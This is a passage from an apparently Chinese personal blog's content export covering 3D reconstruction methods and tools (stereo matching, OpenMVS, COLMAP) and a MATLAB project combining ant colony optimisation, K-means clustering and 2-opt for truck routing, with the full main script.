class="headerlink" title="3.3、Shape from DE-focus 距离产生blur模糊确定深度"></a>3.3、Shape from DE-focus 距离产生blur模糊确定深度</h4><p>相机都有一个距离极限，当物体距离相机太远或者太近时，会出现Blur的现象，如果有多张2D的图，Blur的程度有所不同，则通过对比其Blur的程度推算出物体的深度信息，当然该方法的应用十分有限。</p><h4 id="3-4、Stereo-matching-立体匹配-双视图-视差计算深度"><a href="#3-4、Stereo-matching-立体匹配-双视图-视差计算深度" class="headerlink" title="3.4、Stereo  matching 立体匹配 双视图 视差计算深度"></a>3.4、Stereo  matching 立体匹配 双视图 视差计算深度</h4><p>立体匹配是模拟人的两只眼睛，一般的Stereo相机有两个离得很近的镜头，代表人的两只眼睛，然后通过计算左右两个镜头的视差，则可以推算出3D的深度信息。如下图所示，一个3D空间的点分别投影到左右两张图上，左右两张图由stereo的两个镜头所拍摄。如果3D点的深度比较浅，则左右两个2D点的视差比较大；相反，如果3D点的深度比较深，则左右两个2D点的视差比较小。</p><p>所以通过对左右两幅图进行2D匹配，找到相对应两个点的视差，则可以推算出3D点的深度。</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/v2-c33bf4f6cc88e311b83caba840884e94_b.jpg" alt="img"></p><h4 id="3-5、-Shape-from-motion-SFM运动估计-系列图"><a href="#3-5、-Shape-from-motion-SFM运动估计-系列图" class="headerlink" title="3.5、 Shape from motion SFM运动估计 系列图"></a>3.5、 Shape from motion SFM运动估计 系列图</h4><p>在motion中获得物体的多张2D多角度图，然后两两用d）的方法进行处理</p><h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><p>2017-10：<a href="https://zhuanlan.zhihu.com/p/30472506">https://zhuanlan.zhihu.com/p/30472506</a></p><h3 id="4、OpenMVS"><a href="#4、OpenMVS" class="headerlink" title="4、OpenMVS"></a>4、OpenMVS</h3><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210321165424252.png" alt="image-20210321165424252"><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210321165530841.png" alt="image-20210321165530841"><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210321165543987.png" alt="image-20210321165543987"></p><p>学习路线</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210321165729992.png" alt="image-20210321165729992"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210321165853987.png" alt="image-20210321165853987"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210321165904439.png" alt="image-20210321165904439"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210321165831210.png" alt="image-20210321165831210"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210321165807160.png" alt="image-20210321165807160"></p><p>上面是奥比中光的卖课视频大纲<a href="https://www.bilibili.com/video/BV1Zz4y117UY">https://www.bilibili.com/video/BV1Zz4y117UY</a></p><h3 id="5、三维重建传统方法与现代方法"><a href="#5、三维重建传统方法与现代方法" class="headerlink" title="5、三维重建传统方法与现代方法"></a>5、三维重建传统方法与现代方法</h3><p>ubuntu16.04+openMVG+openMVS实现三维重建</p><p><a href="https://segmentfault.com/a/1190000022276314?utm_source=tag-newest">https://segmentfault.com/a/1190000022276314?utm_source=tag-newest</a></p><p>2020年4月：</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210321190750933.png" alt="image-20210321190750933"></p><ul><li>可以看出openMVG实现的功能是將二维图像转换为point cloud 和 dense cloud，而openMVS则是將点云重建为surface和textured。</li><li>openMVG与openMVS的好处是开源、稳定、有官方说明文档，且两者互补，<strong>共同构建了一套完整的三维重建系统</strong>。</li></ul><p><a href="http://leohope.com/%E8%A7%A3%E9%97%AE%E9%A2%98/2018/03/06/compare-re3d-system/">http://leohope.com/%E8%A7%A3%E9%97%AE%E9%A2%98/2018/03/06/compare-re3d-system/</a></p><h3 id="6、CUDA-统一计算设备架构（Compute-Unified-Device-Architecture-）"><a href="#6、CUDA-统一计算设备架构（Compute-Unified-Device-Architecture-）" class="headerlink" title="6、CUDA 统一计算设备架构（Compute Unified Device Architecture, ）"></a>6、CUDA 统一计算设备架构（Compute Unified Device Architecture, ）</h3><p>【CUDA教程】一、认识cuda - 刘冬煜的文章 - 知乎 <a href="https://zhuanlan.zhihu.com/p/146431357">https://zhuanlan.zhihu.com/p/146431357</a></p><h2 id="实验部分"><a href="#实验部分" class="headerlink" title="实验部分"></a>实验部分</h2><h3 id="colmap实验复现"><a href="#colmap实验复现" class="headerlink" title="colmap实验复现"></a>colmap实验复现</h3><p>关于colmap的使用，链接<a href="https://www.bilibili.com/video/BV135411G7sR">https://www.bilibili.com/video/BV135411G7sR</a></p><p>时隔几月，B站山出现了不少基于colmap做出来的东西，当时我学的时候还没有。</p><p>尝试使用开源软件COLMAP进行三维重建</p><p>这是我曾经用华为荣耀青春版随手拍的20张照片使用笔记本英伟达720GPU跑的三维重建结果</p><p>&lt;video style=”width:700px” src=”<a href="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/video/video/%E4%B8%89%E7%BB%B4%E9%87%8D%E5%BB%BA_batch.mp4&quot;">https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/video/video/%E4%B8%89%E7%BB%B4%E9%87%8D%E5%BB%BA_batch.mp4&quot;</a></video></p><hr>]]></content>
      
      
      <categories>
          
          <category> AI算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 三维重建 </tag>
            
            <tag> colmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于PCA的人脸识别</title>
      <link href="2023/03/30/AI%E7%AE%97%E6%B3%95/%E5%9F%BA%E4%BA%8EPCA%E7%9A%84%E4%BA%BA%E8%84%B8%E8%AF%86%E5%88%AB/"/>
      <url>2023/03/30/AI%E7%AE%97%E6%B3%95/%E5%9F%BA%E4%BA%8EPCA%E7%9A%84%E4%BA%BA%E8%84%B8%E8%AF%86%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<h2 id="基于PCA的人脸识别项目结果"><a href="#基于PCA的人脸识别项目结果" class="headerlink" title="基于PCA的人脸识别项目结果"></a>基于PCA的人脸识别项目结果</h2><p>&lt;video style=”width:700px” src=”<a href="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/video/video/matlab_pca%E4%BA%BA%E8%84%B8%E8%AF%86%E5%88%AB_batch.mp4&quot;">https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/video/video/matlab_pca%E4%BA%BA%E8%84%B8%E8%AF%86%E5%88%AB_batch.mp4&quot;</a></video></p>]]></content>
      
      
      <categories>
          
          <category> AI算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PCA </tag>
            
            <tag> 人脸识别 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MATLAB——基于蚁群算法下的K-means聚类与2-opt优化</title>
      <link href="2023/03/30/AI%E7%AE%97%E6%B3%95/%E5%9F%BA%E4%BA%8E%E8%9A%81%E7%BE%A4%E7%AE%97%E6%B3%95%E4%B8%8B%E7%9A%84K-means%E8%81%9A%E7%B1%BB%E4%B8%8E2-opt%E4%BC%98%E5%8C%96/"/>
      <url>2023/03/30/AI%E7%AE%97%E6%B3%95/%E5%9F%BA%E4%BA%8E%E8%9A%81%E7%BE%A4%E7%AE%97%E6%B3%95%E4%B8%8B%E7%9A%84K-means%E8%81%9A%E7%B1%BB%E4%B8%8E2-opt%E4%BC%98%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h3 id="写在前面无关紧要的话"><a href="#写在前面无关紧要的话" class="headerlink" title="写在前面无关紧要的话"></a>写在前面无关紧要的话</h3><p>昨天和今天两天都在为了自己的面子而爬坑，哎，人呐，有时候总是要为自己吹出去的牛皮买单的，这不，我这两天就在买单。。。</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210518163835961.png" alt="image-20210518163835961"></p><p>由于以前我经常用matlab接单子（这里承诺之后把之前的接单经历补上来/doge），所以，我就嘴贱的问了问</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210518164243741.png" alt="image-20210518164243741"></p><p>这不，需求就来了：</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210518164332677.png" alt="image-20210518164332677">我看又是matlab，又是k均值，而且看起来又不难的样子，就帮个忙吧，可能也不耗什么时间。</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210518171630877.png" alt="image-20210518171630877"></p><p>结果……k-mean还是小事，2-opt问题也不大，遇到个坑导致我啃了个蚁群算法。我是个守约的强迫症患者，答应的事情，2天内，就不可以拖。于是，认真起来，这收获满满的，不在此记录一下对不起我这一天半的时间和精力。</p><hr><h3 id="项目学习与升级"><a href="#项目学习与升级" class="headerlink" title="项目学习与升级"></a>项目学习与升级</h3><h4 id="整个项目架构"><a href="#整个项目架构" class="headerlink" title="整个项目架构"></a>整个项目架构</h4><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210518172525320.png" alt="image-20210518172525320"></p><p>有GUI，有main.m，有3个main中调用的主要算法函数文件夹，有doc文档，很正规的项目。没猜错应该是老外开发的，因为注释和文档中一堆波兰语（百度翻译说的），一个都看不懂。我以前帮人家搞的小项目直接是一个全家桶main.m，如果太多就把里面的函数分出来单独作m文件，一般情况只要写的有条理，没问题。</p><p>如果分函数，不同函数中要用到同一个变量，除了参数传递之外，有时候使用global全局变量比较方便，直接跨文件调用，前提是这些m文件在同一个文件夹下。</p><h4 id="尝试运行main文件"><a href="#尝试运行main文件" class="headerlink" title="尝试运行main文件"></a>尝试运行main文件</h4><p><video style="width:700px" src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/video/video/matlab_kmeans%E8%9A%81%E7%BE%A4%E7%AE%97%E6%B3%95_x264.mp4"></video></p><p>此处放个视频，原版的figure的位置挺不错的，学习下，给人一种看起来很厉害的样子</p><p>看它怎么做的，贴上main</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line">clc;</span><br><span class="line">clear all;</span><br><span class="line">close all;</span><br><span class="line">addpath alg-pszczeli;</span><br><span class="line">addpath gen;</span><br><span class="line">addpath mrowkowy;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> n <span class="built_in">size</span> cost_matrix <span class="built_in">type</span>;</span><br><span class="line">max_iter = <span class="number">80</span>;</span><br><span class="line">n = <span class="number">3</span> <span class="comment">%卡车数量</span></span><br><span class="line"><span class="built_in">size</span> = <span class="number">20</span>; <span class="comment">%城市数量</span></span><br><span class="line"><span class="keyword">global</span> N Cn</span><br><span class="line">Cn = n;</span><br><span class="line">N = <span class="built_in">size</span>;</span><br><span class="line"><span class="built_in">type</span> = <span class="number">1</span>;<span class="comment">% 目标函数的类型从0到2  - 参考quality.m</span></span><br><span class="line"></span><br><span class="line">[cost_matrix points] = generate_matrix(<span class="built_in">size</span>, n);</span><br><span class="line"><span class="comment">%%%%%%%%%%%%%%%%%%%%</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BEE_routes=[];</span><br><span class="line">BEE_q=[];</span><br><span class="line">BEE_time=[];</span><br><span class="line">bee_init(cost_matrix,n,<span class="number">200</span>,<span class="number">5</span>,<span class="number">3</span>); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ANT_routes=[];</span><br><span class="line">ANT_q=[];</span><br><span class="line">ANT_time=[];</span><br><span class="line">ant_init(cost_matrix, n, <span class="built_in">inf</span>,<span class="number">1.6</span>, <span class="number">20</span>,  <span class="number">10</span>, <span class="number">0.5</span>, <span class="number">3</span>,  <span class="number">15</span>,  <span class="number">1</span>,  <span class="number">40</span>, Inf);<span class="comment">% 46.3 37.7 37.4 41</span></span><br><span class="line"><span class="comment">%                    Cie,poj,bet,al1,  al2, ro, g1,  g2, g3, pop, popr</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GEN_routes=[];</span><br><span class="line">GEN_q=[];</span><br><span class="line">GEN_time=[];</span><br><span class="line">gen_init(<span class="number">100</span>); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k=<span class="number">1</span>:max_iter</span><br><span class="line">      </span><br><span class="line">    tic;</span><br><span class="line">    [best_route best_q] = bee_step; </span><br><span class="line">    BEE_time = [BEE_time toc];</span><br><span class="line">    BEE_routes = [BEE_routes best_route];</span><br><span class="line">    BEE_q = [BEE_q best_q];</span><br><span class="line">    </span><br><span class="line">    show_path( <span class="number">1</span>, best_route, points, n,<span class="number">0</span>,<span class="string">&#x27;ABC最佳路径图&#x27;</span>);</span><br><span class="line">    set(<span class="number">1</span>,<span class="string">&#x27;Position&#x27;</span>,[<span class="number">0</span> <span class="number">0</span> <span class="number">704</span> <span class="number">772</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">figure</span>(<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">hold</span> on;</span><br><span class="line">    title(<span class="string">&#x27;Best solution graph (blue-bee,red-gen,green-ant)&#x27;</span>);</span><br><span class="line">    xlabel(<span class="string">&#x27;Iteration&#x27;</span>);</span><br><span class="line">    ylabel(<span class="string">&#x27;Quality function&#x27;</span>);</span><br><span class="line">    <span class="built_in">plot</span>(BEE_q,<span class="string">&#x27;.b&#x27;</span>);</span><br><span class="line">    set(<span class="number">2</span>,<span class="string">&#x27;Position&#x27;</span>,[<span class="number">721</span> <span class="number">421</span> <span class="number">704</span> <span class="number">354</span>]);</span><br><span class="line">    grid on;</span><br><span class="line">    <span class="built_in">hold</span> off;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">figure</span>(<span class="number">3</span>);</span><br><span class="line">    <span class="built_in">hold</span> on;</span><br><span class="line">    title(<span class="string">&#x27;Step time graph / Cumulative time (blue-bee,red-gen,green-ant)&#x27;</span>);</span><br><span class="line">    xlabel(<span class="string">&#x27;Iteration&#x27;</span>);</span><br><span class="line">    ylabel(<span class="string">&#x27;Time [s]&#x27;</span>);</span><br><span class="line">    <span class="built_in">plot</span>(BEE_time,<span class="string">&#x27;.b&#x27;</span>);</span><br><span class="line">    <span class="built_in">plot</span>(k,sum(BEE_time),<span class="string">&#x27;.b&#x27;</span>);</span><br><span class="line">    set(<span class="number">3</span>,<span class="string">&#x27;Position&#x27;</span>,[<span class="number">718</span> <span class="number">49</span> <span class="number">704</span> <span class="number">284</span>]);</span><br><span class="line">    grid on;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">%%</span></span><br><span class="line">     </span><br><span class="line">    tic;</span><br><span class="line">    best_routes=[];</span><br><span class="line">    best_qs=[];</span><br><span class="line">    <span class="comment">%disp(&#x27;迭代次数&#x27;)</span></span><br><span class="line">    iter=k  <span class="comment">%外循环迭代的次数</span></span><br><span class="line">    ANT_k_r=<span class="number">30</span>;<span class="comment">%蚂蚁个数？</span></span><br><span class="line">    <span class="keyword">for</span> ANT_k = <span class="number">1</span>:ANT_k_r</span><br><span class="line">        [best_route best_q] = ant_step; </span><br><span class="line">        best_routes=[best_routes;best_route];</span><br><span class="line">        best_qs=[best_qs;best_q];</span><br><span class="line">    <span class="keyword">end</span>;</span><br><span class="line">    <span class="comment">% BSO算法</span></span><br><span class="line">    [best_route best_q]=BSO_arg(best_routes,best_qs,ANT_k_r)</span><br><span class="line">    <span class="comment">%聚类 -&gt; 每个类中挑出最优解 -&gt; 对每个最优解进行2-opt -&gt; 比较新旧值 -&gt; 输出结果</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">%%</span></span><br><span class="line">    ANT_time = [ANT_time toc];</span><br><span class="line">    ANT_routes = [ANT_routes best_route&#x27;];</span><br><span class="line">    ANT_q = [ANT_q best_q];</span><br><span class="line">    </span><br><span class="line">    show_path( <span class="number">5</span>, best_route&#x27;, points, n,<span class="number">0</span>,<span class="string">&#x27;蚁群算法最佳路径图&#x27;</span>);</span><br><span class="line">    set(<span class="number">5</span>,<span class="string">&#x27;Position&#x27;</span>,[<span class="number">0</span> <span class="number">0</span> <span class="number">704</span> <span class="number">772</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">figure</span>(<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">hold</span> on;</span><br><span class="line">    title(<span class="string">&#x27;Best solution graph (blue-bee,red-gen,green-ant)&#x27;</span>);</span><br><span class="line">    xlabel(<span class="string">&#x27;Iteration&#x27;</span>);</span><br><span class="line">    ylabel(<span class="string">&#x27;Quality function&#x27;</span>);</span><br><span class="line">    <span class="built_in">plot</span>(ANT_q,<span class="string">&#x27;.g&#x27;</span>);</span><br><span class="line">    set(<span class="number">2</span>,<span class="string">&#x27;Position&#x27;</span>,[<span class="number">721</span> <span class="number">421</span> <span class="number">704</span> <span class="number">354</span>]);</span><br><span class="line">    grid on;</span><br><span class="line">    <span class="built_in">hold</span> off;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">figure</span>(<span class="number">3</span>);</span><br><span class="line">    <span class="built_in">hold</span> on;</span><br><span class="line">    title(<span class="string">&#x27;Step time graph / Cumulative time (blue-bee,red-gen,green-ant)&#x27;</span>);</span><br><span class="line">    xlabel(<span class="string">&#x27;Iteration&#x27;</span>);</span><br><span class="line">    ylabel(<span class="string">&#x27;Time [s]&#x27;</span>);</span><br><span class="line">    <span class="built_in">plot</span>(ANT_time,<span class="string">&#x27;.g&#x27;</span>);</span><br><span class="line">    <span class="built_in">plot</span>(k,sum(ANT_time),<span class="string">&#x27;.g&#x27;</span>);</span><br><span class="line">    set(<span class="number">3</span>,<span class="string">&#x27;Position&#x27;</span>,[<span class="number">718</span> <span class="number">49</span> <span class="number">704</span> <span class="number">284</span>]);</span><br><span class="line">    grid on;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    tic;</span><br><span class="line">    [best_route best_q] = gen_step; </span><br><span class="line">    GEN_time = [GEN_time toc];</span><br><span class="line">    GEN_routes = [GEN_routes best_route];</span><br><span class="line">    GEN_q = [GEN_q best_q];</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    show_path( <span class="number">4</span>, best_route&#x27;, points, n,<span class="number">0</span>,<span class="string">&#x27;遗传算法最佳路径图&#x27;</span>);</span><br><span class="line">    set(<span class="number">4</span>,<span class="string">&#x27;Position&#x27;</span>,[<span class="number">0</span> <span class="number">0</span> <span class="number">704</span> <span class="number">772</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">figure</span>(<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">hold</span> on;</span><br><span class="line">    title(<span class="string">&#x27;目标函数对比图 (蓝-ABC,红-GA,绿-ACO)&#x27;</span>);</span><br><span class="line">    xlabel(<span class="string">&#x27;迭代次数&#x27;</span>);</span><br><span class="line">    ylabel(<span class="string">&#x27;评价函数&#x27;</span>);</span><br><span class="line">    <span class="built_in">plot</span>(GEN_q,<span class="string">&#x27;.r&#x27;</span>);</span><br><span class="line">    set(<span class="number">2</span>,<span class="string">&#x27;Position&#x27;</span>,[<span class="number">721</span> <span class="number">421</span> <span class="number">704</span> <span class="number">354</span>]);</span><br><span class="line">    grid on;</span><br><span class="line">    <span class="built_in">hold</span> off;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">figure</span>(<span class="number">7</span>);</span><br><span class="line">    <span class="built_in">hold</span> on;</span><br><span class="line">    title(<span class="string">&#x27;迭代次数曲线图)&#x27;</span>);</span><br><span class="line">    xlabel(<span class="string">&#x27;迭代次数&#x27;</span>);</span><br><span class="line">    ylabel(<span class="string">&#x27;质量函数&#x27;</span>);</span><br><span class="line">    <span class="built_in">plot</span>(ANT_q);</span><br><span class="line">    set(<span class="number">2</span>,<span class="string">&#x27;Position&#x27;</span>,[<span class="number">721</span> <span class="number">421</span> <span class="number">704</span> <span class="number">354</span>]);</span><br><span class="line">    grid on;</span><br><span class="line">    <span class="built_in">hold</span> off;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">figure</span>(<span class="number">3</span>);</span><br><span class="line">    <span class="built_in">hold</span> on;</span><br><span class="line">    title(<span class="string">&#x27;时间对比图(蓝-ABC,红-GA,绿-ACO)&#x27;</span>);</span><br><span class="line">    xlabel(<span class="string">&#x27;迭代次数&#x27;</span>);</span><br><span class="line">    ylabel(<span class="string">&#x27;时间 [s]&#x27;</span>);</span><br><span class="line">    <span class="built_in">plot</span>(GEN_time,<span class="string">&#x27;.r&#x27;</span>);</span><br><span class="line">    <span class="built_in">plot</span>(k,sum(GEN_time),<span class="string">&#x27;.r&#x27;</span>);</span><br><span class="line">    set(<span class="number">3</span>,<span class="string">&#x27;Position&#x27;</span>,[<span class="number">718</span> <span class="number">49</span> <span class="number">704</span> <span class="number">284</span>]);</span><br><span class="line">    grid on;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">figure</span>(<span class="number">6</span>);      </span><br><span class="line">    <span class="built_in">plot</span>(points(:,<span class="number">1</span>),points(:,<span class="number">2</span>),<span class="string">&#x27;s&#x27;</span>);</span><br><span class="line">    title(<span class="string">&#x27;城市坐标点图&#x27;</span>);</span><br><span class="line">    xlabel(<span class="string">&#x27;横坐标&#x27;</span>);</span><br><span class="line">    ylabel(<span class="string">&#x27;纵坐标&#x27;</span>);   </span><br><span class="line">    pause(<span class="number">0.01</span>);</span><br><span class="line"><span class="keyword">end</span>;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用的set控制的位置</p><p>figure也有技巧，hold on然后每次加数据</p><hr><h4 id="关于K-means聚类"><a href="#关于K-means聚类" class="headerlink" title="关于K-means聚类"></a>关于K-means聚类</h4><h5 id="matlab中K-means函数使用"><a href="#matlab中K-means函数使用" class="headerlink" title="matlab中K-means函数使用"></a>matlab中K-means函数使用</h5><p>K-means聚类算法采用的是将NxP的矩阵X划分为K个类，使得类内对象之间的距离最大,而类之间的距离最小。<br>使用方法：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Idx=Kmeans(X,K)</span><br><span class="line">      [Idx,C]=Kmeans(X,K) </span><br><span class="line">      [Idx,C,sumD]=Kmeans(X,K) </span><br><span class="line">      [Idx,C,sumD,D]=Kmeans(X,K) </span><br><span class="line">      […]=Kmeans(…,’Param1’,Val1,’Param2’,Val2,…)</span><br></pre></td></tr></table></figure><p>各输入输出参数介绍：</p><table><thead><tr><th align="center">参数</th><th align="center">介绍</th></tr></thead><tbody><tr><td align="center">X</td><td align="center">NxP的数据矩阵</td></tr><tr><td align="center">K</td><td align="center">表示将X划分为几类，为整数</td></tr><tr><td align="center">Idx</td><td align="center">Nx1的向量，存储的是每个点的聚类标号</td></tr><tr><td align="center">C</td><td align="center">KxP的矩阵，存储的是K个聚类质心位置</td></tr><tr><td align="center">sumD</td><td align="center">1xK的和向量，存储的是类间所有点与该类质心点距离之和</td></tr><tr><td align="center">D</td><td align="center">NxK的矩阵，存储的是每个点与所有质心的距离</td></tr><tr><td align="center">[…]</td><td align="center">Kmeans(…,’Param1’,Val1,’Param2’,Val2,…)</td></tr></tbody></table><p>  最后一条中的参数Param1、Param2等，主要可以设置为如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> 1. ‘Distance’(距离测度)</span><br><span class="line">        ‘sqEuclidean’ 欧式距离（默认时，采用此距离方式）</span><br><span class="line">        ‘cityblock’ 绝度误差和，又称：L1</span><br><span class="line">        ‘cosine’ 针对向量</span><br><span class="line">        ‘correlation’  针对有时序关系的值</span><br><span class="line">        ‘Hamming’ 只针对二进制数据</span><br><span class="line"> 2. ‘Start’（初始质心位置选择方法）</span><br><span class="line">        ‘sample’ 从X中随机选取K个质心点</span><br><span class="line">        ‘uniform’ 根据X的分布范围均匀的随机生成K个质心</span><br><span class="line">        ‘cluster’ 初始聚类阶段随机选择10%的X的子样本（此方法初始使用’sample’方法）</span><br><span class="line">         matrix 提供一K*P的矩阵，作为初始质心位置集合</span><br><span class="line">3. ‘Replicates’（聚类重复次数）  整数</span><br></pre></td></tr></table></figure><hr><h4 id="关于蚁群算法"><a href="#关于蚁群算法" class="headerlink" title="关于蚁群算法"></a>关于蚁群算法</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210518232224893.png" alt="image-20210518232224893"></p><p>参考资料：</p><p>百度百科：<a href="https://baike.baidu.com/item/%E8%9A%81%E7%BE%A4%E7%AE%97%E6%B3%95/9646604?fr=aladdin">https://baike.baidu.com/item/%E8%9A%81%E7%BE%A4%E7%AE%97%E6%B3%95/9646604?fr=aladdin</a></p><p>蚁群算法（Ant Colony Optimization） - 王荣胜的文章 - 知乎 <a href="https://zhuanlan.zhihu.com/p/137408401">https://zhuanlan.zhihu.com/p/137408401</a> （python代码参考资料）</p><h5 id="基于蚁群算法求解TSP旅行商问题"><a href="#基于蚁群算法求解TSP旅行商问题" class="headerlink" title="基于蚁群算法求解TSP旅行商问题"></a>基于蚁群算法求解TSP旅行商问题</h5><p>matlab代码</p><p>参考资料：<a href="https://blog.csdn.net/qq_41581769/article/details/88258116">https://blog.csdn.net/qq_41581769/article/details/88258116</a></p><hr><h4 